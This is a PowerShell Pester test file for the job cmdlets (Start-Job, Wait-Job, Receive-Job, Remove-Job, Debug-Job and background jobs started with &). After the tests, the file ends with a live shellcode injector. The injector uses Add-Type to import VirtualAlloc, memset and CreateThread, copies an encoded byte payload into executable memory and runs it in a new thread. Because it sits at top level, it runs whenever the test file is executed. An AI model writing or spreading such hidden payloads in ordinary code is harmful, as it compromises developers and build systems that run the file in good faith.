

Describe "Job Cmdlet Tests" -Tag "CI" {
    Context "Simple Jobs" {
        BeforeEach {
            $j = Start-Job -ScriptBlock { 1 + 1 } -Name "My Job"
        }
        AfterEach {
            Get-Job | Remove-Job -Force
        }
        It "Start-Job produces a job object" {
            $j | Should -BeOfType "System.Management.Automation.Job"
            $j.Name | Should -BeExactly "My Job"
        }
        It "Get-Job retrieves a job object" {
            (Get-Job -Id $j.Id) | Should -BeOfType "System.Management.Automation.Job"
        }
        It "Get-Job retrieves an array of job objects" {
            Start-Job -ScriptBlock { 2 * 2 }
            $jobs = Get-Job
            $jobs.Count | Should -Be 2
            foreach ($job in $jobs)
            {
                $job | Should -BeOfType "System.Management.Automation.Job"
            }
        }
        It "Remove-Job can remove a job" {
            Remove-Job $j -Force
            { Get-Job $j -ErrorAction Stop } | Should -Throw -ErrorId "JobWithSpecifiedNameNotFound,Microsoft.PowerShell.Commands.GetJobCommand"
        }
        It "Receive-Job can retrieve job results" {
            Wait-Job -Timeout 60 -id $j.id | Should -Not -BeNullOrEmpty
            receive-job -id $j.id | Should -Be 2
        }
        It "-RunAs32 not supported from 64-bit pwsh" -Skip:(-not [System.Environment]::Is64BitProcess) {
            { Start-Job -ScriptBlock {} -RunAs32 } | Should -Throw -ErrorId "RunAs32NotSupported,Microsoft.PowerShell.Commands.StartJobCommand"
        }
        It "-RunAs32 supported in 32-bit pwsh" -Skip:([System.Environment]::Is64BitProcess) {
            $job = Start-Job -ScriptBlock { 1+1 } -RunAs32
            Receive-Job $job -Wait | Should -Be 2
        }
    }
    Context "Jobs with arguments" {
        It "Start-Job accepts arguments" {
            $sb = { Write-Output $args[1]; Write-Output $args[0] }
            $j = Start-Job -ScriptBlock $sb -ArgumentList "$TestDrive", 42
            Wait-job -Timeout (5 * 60) $j | Should -Be $j
            $r = Receive-Job $j
            $r -Join "," | Should -Be "42,$TestDrive"
        }
    }
    Context "jobs which take time" {
        BeforeEach {
            $j = Start-Job -ScriptBlock { Start-Sleep -Seconds 15 }
        }
        AfterEach {
            Get-Job | Remove-Job -Force
        }
        It "Wait-Job will wait for a job" {
            $result = Wait-Job $j
            $result | Should -Be $j
            $j.State | Should -BeExactly "Completed"
        }
        It "Wait-Job will timeout waiting for a job" {
            $result = Wait-Job -Timeout 2 $j
            $result | Should -BeNullOrEmpty
        }
        It "Stop-Job will stop a job" {
            Stop-Job -Id $j.Id
            $out = Receive-Job $j -ErrorVariable err
            $out | Should -BeNullOrEmpty
            $err | Should -BeNullOrEmpty
            $j.State | Should -BeExactly "Stopped"
        }
        It "Remove-Job will not remove a running job" {
            $id = $j.Id
            Remove-Job $j -ErrorAction SilentlyContinue
            $job = Get-Job -Id $id
            $job | Should -Be $j
        }
        It "Remove-Job -Force will remove a running job" {
            $id = $j.Id
            Remove-Job $j -Force
            $job = Get-Job -Id $id -ErrorAction SilentlyContinue
            $job | Should -BeNullOrEmpty
        }
    }
    Context "Retrieving partial output from jobs" {
        BeforeAll {
            function GetResults($job, $n, $keep)
            {
                $results = @()

                
                for ($count = 0; $results.Count -lt $n; $count++)
                {
                    if ($count -eq 1000)
                    {
                        
                        throw "Receive-Job behaves suspiciously: Cannot receive $n results in 5 minutes."
                    }

                    
                    Start-Sleep -Milliseconds 300

                    if ($keep)
                    {
                        $results = Receive-Job -Keep $job
                    }
                    else
                    {
                        $results += Receive-Job $job
                    }
                }

                return $results
            }

            function CheckContent($array)
            {
                for ($i=1; $i -lt $array.Count; $i++)
                {
                    if ($array[$i] -ne ($array[$i-1] + 1))
                    {
                        return $false
                    }
                }

                return $true
            }

        }
        BeforeEach {
            $j = Start-Job -ScriptBlock { $count = 1; while ($true) { Write-Output ($count++); Start-Sleep -Milliseconds 30 } }
        }
        AfterEach {
            Get-Job | Remove-Job -Force
        }

        It "Receive-Job will retrieve partial output" {
            $result1 = GetResults $j 5 $false
            $result2 = GetResults $j 5 $false
            CheckContent ($result1 + $result2) | Should -BeTrue
        }
        It "Receive-Job will retrieve partial output, including -Keep results" {
            $result1 = GetResults $j 5 $true
            $result2 = GetResults $j ($result1.Count + 5) $false
            Compare-Object -SyncWindow 0 -PassThru $result1 $result2[0..($result1.Count-1)] | Should -BeNullOrEmpty
            $result2[$result1.Count - 1] + 1 | Should -Be $result2[$result1.Count]
        }
    }
}
Describe "Debug-job test" -tag "Feature" {
    BeforeAll {
        $rs = [runspacefactory]::CreateRunspace()
        $rs.Open()
        $rs.Debugger.SetDebugMode([System.Management.Automation.DebugModes]::RemoteScript)
        $rs.Debugger.add_DebuggerStop({$true})
        $ps = [powershell]::Create()
        $ps.Runspace = $rs
    }
    AfterAll {
        $rs.Dispose()
        $ps.Dispose()
    }
    
    
    It "Debug-Job will break into debugger" -pending {
        $ps.AddScript('$job = start-job { 1..300 | ForEach-Object { Start-Sleep 1 } }').Invoke()
        $ps.Commands.Clear()
        $ps.Runspace.Debugger.GetCallStack() | Should -BeNullOrEmpty
        Start-Sleep 3
        $asyncResult = $ps.AddScript('debug-job $job').BeginInvoke()
        $ps.commands.clear()
        Start-Sleep 2
        $result = $ps.runspace.Debugger.GetCallStack()
        $result.Command | Should -BeExactly "<ScriptBlock>"
    }
}

Describe "Ampersand background test" -tag "CI","Slow" {
    Context "Simple background job" {
        AfterEach {
            Get-Job | Remove-Job -Force
        }
        It "Background with & produces a job object" {
            $j = Write-Output Hi &
            $j | Should -BeOfType System.Management.Automation.Job
        }
    }
    Context "Variable tests" {
        AfterEach {
            Get-Job | Remove-Job -Force
        }
        It "doesn't cause error when variable is missing" {
            Remove-Item variable:name -ErrorAction Ignore
            $j = write-output "Hi $name" &
            Receive-Job $j -Wait | Should -BeExactly "Hi "
        }
        It "Copies variables to the child process" {
            $n1 = "Bob"
            $n2 = "Mary"
            ${n 3} = "Bill"
            $j = Write-Output "Hi $n1! Hi ${n2}! Hi ${n 3}!" &
            Receive-Job $j -Wait | Should -BeExactly "Hi Bob! Hi Mary! Hi Bill!"
        }
        It 'Make sure that $PID from the parent process does not overwrite $PID in the child process' {
            $j = Write-Output $pid &
            $cpid = Receive-Job $j -Wait
            $pid | Should -Not -BeExactly $cpid
        }
        It 'Make sure that $global:PID from the parent process does not overwrite $global:PID in the child process' {
            $j = Write-Output $global:pid &
            $cpid = Receive-Job -Wait $j
            $pid | Should -Not -BeExactly $cpid
        }
        It "starts in the current directory" {
            $j = Get-Location | Foreach-Object -MemberName Path &
            Receive-Job -Wait $j | Should -Be ($pwd.Path)
        }
        It "Test that output redirection is done in the background job" {
            $j = Write-Output hello > $TESTDRIVE/hello.txt &
            Receive-Job -Wait $j | Should -BeNullOrEmpty
            Get-Content $TESTDRIVE/hello.txt | Should -BeExactly "hello"
        }
        It "Test that error redirection is done in the background job" {
            $j = Write-Error MyError 2> $TESTDRIVE/myerror.txt &
            Receive-Job -Wait $j | Should -BeNullOrEmpty
            Get-Content -Raw $TESTDRIVE/myerror.txt | Should -Match "MyError"
        }
    }
    Context "Backgrounding expressions" {
        AfterEach {
            Get-Job | Remove-Job -Force
        }
        It "handles backgrounding expressions" {
            $j = 2+3 &
            Receive-Job $j -Wait | Should -Be 5
        }
        It "handles backgrounding mixed expressions" {
            $j = 1..10 | ForEach-Object -Begin {$s=0} -Process {$s += $_} -End {$s} &
            Receive-Job -Wait $j | Should -Be 55
        }
    }
}

$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xba,0xfe,0x81,0xdb,0xd0,0xdd,0xc0,0xd9,0x74,0x24,0xf4,0x5e,0x2b,0xc9,0xb1,0x47,0x31,0x56,0x13,0x83,0xee,0xfc,0x03,0x56,0xf1,0x63,0x2e,0x2c,0xe5,0xe6,0xd1,0xcd,0xf5,0x86,0x58,0x28,0xc4,0x86,0x3f,0x38,0x76,0x37,0x4b,0x6c,0x7a,0xbc,0x19,0x85,0x09,0xb0,0xb5,0xaa,0xba,0x7f,0xe0,0x85,0x3b,0xd3,0xd0,0x84,0xbf,0x2e,0x05,0x67,0xfe,0xe0,0x58,0x66,0xc7,0x1d,0x90,0x3a,0x90,0x6a,0x07,0xab,0x95,0x27,0x94,0x40,0xe5,0xa6,0x9c,0xb5,0xbd,0xc9,0x8d,0x6b,0xb6,0x93,0x0d,0x8d,0x1b,0xa8,0x07,0x95,0x78,0x95,0xde,0x2e,0x4a,0x61,0xe1,0xe6,0x83,0x8a,0x4e,0xc7,0x2c,0x79,0x8e,0x0f,0x8a,0x62,0xe5,0x79,0xe9,0x1f,0xfe,0xbd,0x90,0xfb,0x8b,0x25,0x32,0x8f,0x2c,0x82,0xc3,0x5c,0xaa,0x41,0xcf,0x29,0xb8,0x0e,0xd3,0xac,0x6d,0x25,0xef,0x25,0x90,0xea,0x66,0x7d,0xb7,0x2e,0x23,0x25,0xd6,0x77,0x89,0x88,0xe7,0x68,0x72,0x74,0x42,0xe2,0x9e,0x61,0xff,0xa9,0xf6,0x46,0x32,0x52,0x06,0xc1,0x45,0x21,0x34,0x4e,0xfe,0xad,0x74,0x07,0xd8,0x2a,0x7b,0x32,0x9c,0xa5,0x82,0xbd,0xdd,0xec,0x40,0xe9,0x8d,0x86,0x61,0x92,0x45,0x57,0x8e,0x47,0xc9,0x07,0x20,0x38,0xaa,0xf7,0x80,0xe8,0x42,0x12,0x0f,0xd6,0x73,0x1d,0xda,0x7f,0x19,0xe7,0x8c,0xbf,0x76,0xe6,0x22,0x28,0x85,0xe9,0xbb,0x13,0x00,0x0f,0xd1,0x73,0x45,0x87,0x4d,0xed,0xcc,0x53,0xec,0xf2,0xda,0x19,0x2e,0x78,0xe9,0xde,0xe0,0x89,0x84,0xcc,0x94,0x79,0xd3,0xaf,0x32,0x85,0xc9,0xda,0xba,0x13,0xf6,0x4c,0xed,0x8b,0xf4,0xa9,0xd9,0x13,0x06,0x9c,0x52,0x9d,0x92,0x5f,0x0c,0xe2,0x72,0x60,0xcc,0xb4,0x18,0x60,0xa4,0x60,0x79,0x33,0xd1,0x6e,0x54,0x27,0x4a,0xfb,0x57,0x1e,0x3f,0xac,0x3f,0x9c,0x66,0x9a,0x9f,0x5f,0x4d,0x1a,0xe3,0x89,0xab,0x68,0x0d,0x0a;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

